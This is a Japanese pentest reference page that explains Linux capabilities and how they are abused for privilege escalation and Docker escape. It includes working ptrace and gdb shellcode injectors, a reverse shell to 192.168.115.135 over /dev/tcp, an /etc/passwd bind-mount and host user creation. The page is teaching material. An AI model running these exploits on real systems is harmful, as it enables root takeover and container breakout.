# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities は、**root 権限を小さく独立した単位に分割**し、プロセスが権限の一部だけを持てるようにします。これにより、不要に root 権限をすべて付与するリスクを最小限に抑えます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 問題:

- 通常のユーザーは、raw socket のオープンや 1024 未満の Internet port への bind などの操作に対する権限が限られています。capabilities を使えば、root 権限をすべて付与する代わりに、必要な操作だけを許可できます。<sup>[[14]](#references)</sup>

### Capability Sets:

Linux はスレッドごとにこれらの capability set を公開し、プロセスが資格情報を変更したりファイルを実行したりするとき、kernel がその制約を適用します。<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **目的**: 実行するファイルに対応する inheritable file capabilities がある場合、`execve()` 後に permitted set に加わる可能性のある capabilities を示します。
   - **機能**: スレッドの inheritable set は `execve()` をまたいで維持されます。この set だけで capabilities が effective になることはありません。
   - **制限**: この set への capability の追加は、permitted set と bounding set による制約を受けます。<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **目的**: プロセスがその時点で実際に使用している capabilities を表します。
   - **機能**: さまざまな操作を許可するかどうかを kernel が確認する capabilities の set です。ファイルの場合、この set は、ファイルの permitted capabilities を effective として扱うかどうかを示すフラグになることがあります。
   - **重要性**: effective set は、プロセスが使用できる active な capabilities の set として、即時の権限チェックにおいて重要です。

3. **Permitted (CapPrm)**:

   - **目的**: プロセスが保持できる capabilities の最大 set を定義します。
   - **機能**: プロセスは permitted set から capability を effective set に昇格させ、その capability を使用できるようにできます。また、permitted set から capabilities を削除することもできます。
   - **境界**: この set から capability を削除すると、その capability を付与するファイルを実行するか、別の特権遷移が発生しない限り、通常は復元できません。<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **目的**: `execve()` 中にファイルからプロセスが取得できる capabilities と、inheritable set に追加できる capabilities を制限します。
   - **機能**: この set は `fork()` をまたいで継承され、`execve()` をまたいで維持されます。呼び出し元が `CAP_SETPCAP` を持つ場合、capabilities をこの set から削除できます。
   - **用途**: この set から不要な capabilities を削除すると、後から権限を取得できる範囲を制限できます。<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **目的**: 非特権プログラムの `execve()` 後も、選択した capabilities を permitted および effective の状態に保てるようにします。
   - **機能**: 実行するファイルが特権ファイルでない場合、ambient capabilities は新しい permitted set と effective set に追加されます。
   - **制限**: capability が ambient であるためには、permitted set と inheritable set の両方に含まれている必要があります。set-user-ID/set-group-ID ファイル、または capabilities を持つファイルを実行すると、ambient set はクリアされます。<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes & Binaries Capabilities

### Processes Capabilities

特定のプロセスの capabilities を確認するには、/proc ディレクトリ内の **status** ファイルを使用します。このファイルには詳細な情報が含まれているため、Linux capabilities 関連の情報だけに絞って確認します。\
実行中のすべてのプロセスについて、capability 情報はスレッドごとに管理されます。一方、file capabilities は `security.capability` 拡張属性に保存されます。<sup>[[14]](#references)[[15]](#references)</sup>

capabilities の定義は /usr/include/linux/capability.h で確認できます。

現在のプロセスの capabilities は `cat /proc/self/status` または `capsh --print` で確認できます。他のプロセスの capabilities は `/proc/<pid>/status` で確認できます。<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

このコマンドは、ほとんどのシステムで5行の capability を返します。<sup>[[15]](#references)</sup>

- CapInh = 継承可能な capability
- CapPrm = 許可された capability
- CapEff = 有効な capability
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

これらの16進数は意味がわかりません。`capsh`ユーティリティを使うと、capability名にデコードできます。<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

それでは、`ping` が使用する **capabilities** を確認しましょう:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

それでも機能しますが、別のもっと簡単な方法があります。実行中のプロセスの capabilities を確認するには、**getpcaps** ツールの後にプロセス ID（PID）を指定します。プロセス ID のリストも指定できます。<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

`tcpdump` バイナリに `cap_net_admin` と `cap_net_raw` を付与してネットワークを sniff した後の capabilities を確認しましょう（`tcpdump` はプロセス 9562 で実行されています）。<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

ご覧のとおり、capabilities はプロセスを調査する2つの方法で得られる結果と一致しています。`getpcaps` ツールは libcap を使って対象プロセスの capabilities を照会し、テキスト形式で表示します。PIDは1つ以上指定できます。<sup>[[22]](#references)</sup>

### バイナリの capabilities

バイナリには、実行時に適用される file capabilities を設定できます。たとえば、`ping` バイナリに `cap_net_raw` capability が設定されている場合があります。<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

`getcap -r` を使用して、**capabilities** を持つバイナリを検索できます。<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### capshを使用したcapabilitiesの削除

現在のbounding setから`CAP_NET_RAW`を削除すると、そのcapabilityを必要とするプログラムは使用できなくなるはずです。<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

_capsh_ 自体の出力に加えて、_tcpdump_ コマンド自体もエラーを出すはずです。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーは、`CAP_NET_RAW` が bounding set から削除された後、`tcpdump` が要求された file capability で実行できないことを示しています。

### Capabilities の削除

`setcap -r` を使うと、ファイルの capabilities を削除できます。<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## ユーザーのCapabilities

LinuxはログインユーザーにファイルCapabilitiesを直接割り当てませんが、`pam_cap` PAMモジュールを使うと、`/etc/security/capability.conf` を通じて認証済みセッションに継承可能なCapabilitiesを設定できます。<sup>[[16]](#references)</sup> 各エントリでは、カンマ区切りのCapability名または番号を1つ以上のユーザー名に対応付けます。<sup>[[17]](#references)</sup>
ファイルの例：

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## 環境のケイパビリティ

以下のプログラムをコンパイルすると、ケイパビリティを提供する環境内でbashシェルをspawnできます。<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

コンパイル済みの ambient binary によって実行された **bash の内部では**、**新しい capabilities**を確認できます（通常のユーザーは「current」セクションに capability を持ちません）。<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> **追加できるのは、許可集合と継承可能集合の両方に含まれるcapabilityのみです。**<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb バイナリ

Capability-dumb バイナリとは、file capabilities を持ちながら、それらの管理に libcap を使用しないプログラムです。ファイルの effective bit が設定されている場合、カーネルはそのファイルの許可capabilityをプロセスの実効集合に設定します。プロセスが許可capabilityをすべて取得できなかった場合、実行に失敗することがあります。<sup>[[14]](#references)</sup>

## Service Capabilities

root として実行されるシステムサービスは、実行環境による制限がなければ、広範なcapabilityを保持することがあります。systemd unit では、`User=` がサービスユーザーを指定し、`AmbientCapabilities=` が実行プロセスのアンビエント集合に指定したcapabilityを追加します。<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Dockerコンテナ内のCapabilities

Dockerは、`--cap-add`と`--cap-drop`で変更できるデフォルトのcapabilityセットでコンテナを起動します。コンテナの例は`amicontained`で調査できます。<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities は、特権操作（chroot の設定やソケットへのバインドなど）の実行後に、**自身のプロセスを制限したい場合**に便利です。しかし、悪意のあるコマンドや引数を渡すことで悪用され、それらが root として実行される可能性があります。<sup>[[2]](#references)</sup>

`setcap` を使うとプログラムに file capabilities を設定でき、`getcap` を使うと確認できます。<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

ファイル capability のテキストでは、`+ep` は指定された capability を effective set と permitted set で有効にし、`-` は選択されたフラグを無効にします。<sup>[[21]](#references)</sup>

システムまたはフォルダー内で capability を持つプログラムを特定するには、`getcap -r` を使用します。<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Exploitation の例

次の例では、バイナリ `/usr/bin/python2.6` に privesc の脆弱性があることがわかります。

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

`tcpdump` が任意のユーザーによるパケットのスニッフィングを**可能にする**ために必要な **Capabilities**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### capability 名が省略されている場合の特例

libcap のテキスト形式では、`getcap myelf` が `myelf =ep` を報告する場合、実行プロセスの bounding set、user namespace、その他の実行制限の範囲内で、**すべての capabilities** が effective および permitted としてマークされています。空の file capability set は `myelf =`（`e` も `p` もなし）であり、capability 属性のないファイルとは異なります。`=ep` のファイルが、それ自体でプロセスの UID を root に変更することはありませんが、`CAP_DAC_READ_SEARCH` または `CAP_DAC_OVERRIDE` を使用できるプログラムは、Unix UID では読み取れないファイルを読み取れる場合があります。入力オプションを特権的なファイル読み取り経路として扱う前に、実際の実行ファイルの file mode、namespace、および effective capabilities を確認してください。libcap の[capability text format](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)と[empty-value behavior](https://man7.org/linux/man-pages/man8/getcap.8.html)を参照してください。<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は非常に強力な Linux capability であり、デバイスの mount や kernel 機能の操作など、広範な**管理者権限**を持つため、root に近い権限とみなされることがよくあります。システム全体をシミュレートするコンテナには不可欠ですが、**`CAP_SYS_ADMIN` は重大なセキュリティ上の課題をもたらします**。特にコンテナ環境では、権限昇格やシステム侵害につながる可能性があります。そのため、厳格なセキュリティ評価と慎重な管理が必要です。最小権限の**原則**に従い、攻撃対象領域を最小限に抑えるため、アプリケーション専用コンテナではこの capability を削除することが強く推奨されます。<sup>[[14]](#references)</sup>

namespace の切り替えでは、適用範囲が重要です。`setns()` は、対象を所有する user namespace に対して `CAP_SYS_ADMIN` をチェックします。mount namespace に入るには、呼び出し元の user namespace における `CAP_SYS_CHROOT` も必要です。private な remapped user namespace 内だけで保持されている capability では、初期状態の host namespace に任意に入ることはできません。<sup>[[14]](#references)</sup>

**binaryを使った例**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

pythonを使って、変更した _passwd_ ファイルを実際の _passwd_ ファイルの上にマウントできます:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

そして最後に、変更した `passwd` ファイルを `/etc/passwd` に **mount** します:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

また、パスワード「password」を使って **`su` で root になれます**。

**環境を使った例（Docker breakout）**

Docker コンテナ内で有効な capabilities は、次のコマンドで確認できます。

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

前の出力では、SYS_ADMIN capability が有効になっていることが確認できます。<sup>[[14]](#references)</sup>

- **Mount**

適切なデバイスと namespace へのアクセスがあれば、Docker コンテナから**ホストのディスクを mount して、その内容にアクセス**できます。デバイスノードは実際のホストデバイスを表している必要があり、デバイス cgroup がそのアクセスを許可している必要があります。また、ブロックベースのファイルシステムを mount するには、初期 user namespace における `CAP_SYS_ADMIN` が必要です。<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **完全なアクセス**

前の方法では、ホストのディスクにアクセスできました。\
ホストで **ssh** サーバーが稼働している場合、**マウントしたディスク内にユーザーを作成**し、SSH 経由でアクセスできます。<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

`/mnt/host` 配下で直接読み書きできる時点で、すでにホストファイルシステムにアクセスできています。最後の `chroot` はパス名を扱いやすくするだけのもので、さらに `CAP_SYS_CHROOT` が必要です。脱出を実現する手順ではありません。

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` があれば、プロセスは自身の PID namespace から見える他のプロセスを追跡および検査できます。Docker コンテナからホストのプロセスを対象にするには、`--pid=host` でホストの PID namespace を共有するか、対象を含む namespace に参加します。<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` が提供するデバッグ機能やシステムコール追跡機能、および `process_vm_readv(2)` や `process_vm_writev(2)` のようなプロセス間メモリアクセス機能を使う権限を与えます。診断や監視に有用な一方、`ptrace(2)` に対する seccomp フィルターのような制限措置なしに `CAP_SYS_PTRACE` が有効になっていると、システムのセキュリティを大きく損なう可能性があります。具体的には、[このような proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) で実証されているように、seccomp による制限など、他のセキュリティ制限を回避するために悪用できます。<sup>[[10]](#references)</sup>

**バイナリ（Python）を使った例**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**バイナリの例（gdb）**

`gdb` with `ptrace` capability:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

デバッガーに付与された capability は、調査の手掛かりにすぎません。現在のプロセスがそのファイルを実行できるか（グループ権限と ACL 権限を含む）、実行後に `CAP_SYS_PTRACE` が有効になるか、より高い権限を持つターゲットが同じ PID namespace 内で認識され、アタッチ可能かを確認してください。`no_new_privs`、`nosuid` マウント、capability bounding set、Yama、seccomp、または LSM によって結果が変わる場合があります。[`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) と [kernel の Yama ドキュメント](https://docs.kernel.org/admin-guide/LSM/Yama.html)を参照してください。ターゲットにアタッチせずに、ファイルとプロセスのメタデータを列挙してください。

gdb 経由でメモリに注入する shellcode を msfvenom で作成する

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

gdb を使って root プロセスをデバッグし、先ほど生成した gdb の行をコピー＆ペーストします:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**環境を使った例（Docker breakout）- もう1つのgdb Abuse**

**GDB** がインストールされている場合（または、たとえば `apk add gdb` や `apt install gdb` でインストールできる場合）、**可視ホストプロセスをデバッグ**し、`system` 関数を呼び出させることができます。これには、対象の user namespace で有効な `CAP_SYS_PTRACE` と、ホスト PID の可視性が必要です。`CAP_SYS_ADMIN` は必要ありません。Yama、non-dumpable 状態、seccomp、LSM ポリシーによって、attach がブロックされる場合もあります。

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

実行されたコマンドの出力は確認できませんが、そのプロセスによって実行されます（そのため、rev shellを取得してください）。

> [!WARNING]
> エラー「No symbol "system" in current context.」が発生した場合は、gdb経由でプログラムにshellcodeを読み込む前の例を確認してください。

**環境変数を使った例（Docker breakout）- Shellcode Injection**

Dockerコンテナ内で有効なcapabilitiesは、次のコマンドで確認できます。

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

**host** で実行中の**プロセス**を一覧表示 `ps -eaf`

1. **アーキテクチャ**を取得 `uname -m`
2. そのアーキテクチャ用の**shellcode**を探す ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. **shellcode**をプロセスメモリに**inject**する**プログラム**を探す ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. プログラム内の**shellcode**を**変更**して、**コンパイル**する `gcc inject.c -o inject`
5. **inject**して**shell**を取得する: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、プロセスに**カーネルモジュールのロードとアンロード（`init_module(2)`、`finit_module(2)`、`delete_module(2)` システムコール）**を許可し、カーネルの中核的な操作への直接アクセスを可能にします。この capability は、モジュールのロードによってカーネルの動作が変更され、分離境界が無効化されるおそれがあるため、重大なセキュリティリスクをもたらします。<sup>[[6]](#references)[[14]](#references)</sup>
通常の rootful Linux コンテナでは、対象となるのは**共有ホストカーネル**であり、そのため直接的な脱出につながります。モジュールのロードは namespace 化されていないため、この capability は初期 user namespace で有効である必要があります。gVisor、Kata、Hyper-V などの userspace-kernel または VM 分離型ランタイムでは、到達可能なカーネル境界が変わります。モジュールのロードは、`modules_disabled`、kernel lockdown、署名の強制、seccomp、または LSM によって引き続きブロックされる場合があります。<sup>[[14]](#references)</sup>

**バイナリの例**

次の例では、バイナリ **`python`** にこの capability が設定されています。

```bash
getcap -r / 2>/dev/null
